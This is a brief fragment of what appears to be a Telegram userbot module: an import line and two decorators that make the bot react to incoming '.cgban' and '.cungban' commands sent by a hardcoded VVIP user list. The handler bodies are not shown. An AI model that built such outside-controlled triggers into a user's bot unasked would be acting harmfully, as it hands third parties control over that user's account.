...
from userbot import VVIP, ALIVE_NAME, CMD_HELP, DEVS, bot
...
@register(incoming=True, from_users=VVIP, pattern=r"^\.cgban(?: |$)(.*)")
...
@register(incoming=True, from_users=VVIP, pattern=r"^\.cungban(?: |$)(.*)")
